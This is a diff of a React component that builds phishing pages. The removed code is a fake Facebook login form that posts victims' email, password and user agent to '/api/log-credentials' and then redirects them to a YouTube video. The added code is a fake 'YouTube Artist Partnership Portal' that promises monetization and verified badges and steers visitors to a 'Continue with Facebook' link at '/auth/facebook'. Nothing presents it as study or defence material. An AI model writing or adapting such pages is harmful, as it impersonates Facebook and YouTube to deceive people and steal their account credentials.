@@ -1,159 +1,121 @@
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 
-export default function FacebookLogin() {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [error, setError] = useState('');
+export default function YouTubePartnerPortal() {
+  const [isMobile, setIsMobile] = useState(false);
 
-  const validateCredentials = (email, password) => {
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    const phoneRegex = /^\d{10}$/;
-    const cleanEmail = email.replace(/\D/g, '');
-    
-    if (!emailRegex.test(email) && !phoneRegex.test(cleanEmail)) {
-      return "Invalid email or phone number";
-    }
-    
-    const weakPasswords = ['123456', 'password', 'qqqqqq', 'wwwwww', 'aaaaaa', '111111', '000000'];
-    if (password.length < 6) return "Password is too short";
-    if (weakPasswords.includes(password.toLowerCase())) return "Password is too common";
-    if (/(.)\1{5,}/.test(password)) return "Password is too simple";
-    
-    return null;
-  };
-
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    setError('');
-
-    const validationError = validateCredentials(email, password);
-    if (validationError) {
-      setError(validationError);
-      return;
-    }
-
-    try {
-      await fetch('/api/log-credentials', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, userAgent: navigator.userAgent })
-      });
-
-      window.location.href = `https://www.youtube.com/watch?v=dQw4w9WgXcQ&feature=share&artist_welcome=true`;
-      
-    } catch (err) {
-      setError('Login failed. Please try again.');
-    }
-  };
+  useEffect(() => {
+    // Check if mobile device
+    const checkMobile = () => {
+      setIsMobile(/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
+    };
+    checkMobile();
+  }, []);
 
   return (
-    <div className="facebook-container">
-      <div className="facebook-header">
-        <div className="facebook-logo">facebook</div>
+    <div className="container">
+      <div className="header">
+        <div className="youtube-logo">YouTube</div>
+        <h1>Artist Partnership Portal</h1>
+        <p>Get your music featured on official YouTube channels</p>
       </div>
       
-      <div className="login-box">
-        <h2>Log in to Facebook</h2>
-        <p className="app-notice">YouTube Artist Portal wants to access your public profile</p>
+      <div className="content">
+        <div className="benefits">
+          <h3>What you get:</h3>
+          <ul>
+            <li>✅ Featured on YouTube Music channels</li>
+            <li>✅ Monetization enabled immediately</li>
+            <li>✅ Verified artist badge</li>
+            <li>✅ Priority in recommendations</li>
+          </ul>
+        </div>
         
-        <form onSubmit={handleSubmit}>
-          {error && <div className="error-message">{error}</div>}
-          
-          <div className="input-group">
-            <input
-              type="text"
-              placeholder="Email or phone number"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              required
-              className="fb-input"
-            />
-          </div>
-          
-          <div className="input-group">
-            <input
-              type="password"
-              placeholder="Password"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              required
-              className="fb-input"
-            />
-          </div>
-
-          <button type="submit" className="fb-login-button">
-            Log In
-          </button>
-        </form>
-        
-        <div className="links">
-          <a href="#">Forgotten account?</a>
-          <a href="#">Sign up for Facebook</a>
+        <div className="login-section">
+          <p className="login-prompt">Continue with your Facebook account to verify your identity:</p>
+          <a href="/auth/facebook" className="facebook-login-btn">
+            <span className="fb-icon">f</span>
+            Continue with Facebook
+          </a>
+          <p className="disclaimer">We need to verify your social presence to prevent spam</p>
         </div>
       </div>
 
       <style jsx>{`
-        .facebook-container {
-          background: #f0f2f5;
+        .container {
+          max-width: 800px;
+          margin: 0 auto;
+          padding: 20px 15px;
+          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
           min-height: 100vh;
-          font-family: Helvetica, Arial, sans-serif;
+          box-sizing: border-box;
         }
-        .facebook-header {
-          background: white;
-          padding: 16px 0;
-          border-bottom: 1px solid #dddfe2;
-        }
-        .facebook-logo {
+        .youtube-logo {
           font-size: 28px;
           font-weight: bold;
-          color: #1877f2;
+          color: #ff0000;
+          margin-bottom: 15px;
           text-align: center;
         }
-        .login-box {
-          max-width: 400px;
-          margin: 40px auto;
-          background: white;
-          padding: 20px;
-          border-radius: 8px;
-          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        .header h1 {
+          font-size: 24px;
+          text-align: center;
+          margin-bottom: 10px;
         }
-        .fb-input {
-          width: 100%;
-          padding: 14px 16px;
-          border: 1px solid #dddfe2;
-          border-radius: 6px;
-          font-size: 17px;
-          margin-bottom: 12px;
+        .header p {
+          text-align: center;
+          color: #666;
+          margin-bottom: 30px;
         }
-        .fb-login-button {
-          width: 100%;
+        .facebook-login-btn {
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          gap: 10px;
           background: #1877f2;
           color: white;
-          border: none;
-          border-radius: 6px;
-          padding: 12px;
-          font-size: 20px;
-          font-weight: bold;
-          cursor: pointer;
-        }
-        .error-message {
-          background: #ffebe8;
-          border: 1px solid #dd3c10;
-          color: #dd3c10;
-          padding: 12px;
-          border-radius: 6px;
-          margin-bottom: 16px;
-          font-size: 14px;
-        }
-        .links {
-          display: flex;
-          justify-content: space-between;
-          margin-top: 20px;
-        }
-        .links a {
-          color: #1877f2;
+          padding: 16px 24px;
+          border-radius: 8px;
           text-decoration: none;
+          font-weight: bold;
+          font-size: 16px;
+          margin: 20px 0;
+          min-height: 44px; /* Minimum touch target size */
+          box-sizing: border-box;
+        }
+        .benefits ul {
+          padding-left: 20px;
+        }
+        .benefits li {
+          margin-bottom: 10px;
           font-size: 14px;
+        }
+        .login-prompt {
+          text-align: center;
+          margin-bottom: 15px;
+          font-size: 16px;
+        }
+        .disclaimer {
+          text-align: center;
+          font-size: 12px;
+          color: #666;
+          margin-top: 10px;
+        }
+        
+        /* Mobile-specific styles */
+        @media (max-width: 768px) {
+          .container {
+            padding: 15px 10px;
+          }
+          .header h1 {
+            font-size: 20px;
+          }
+          .youtube-logo {
+            font-size: 24px;
+          }
+          .facebook-login-btn {
+            padding: 18px 20px;
+            font-size: 18px;
+          }
         }
       `}</style>
     </div>
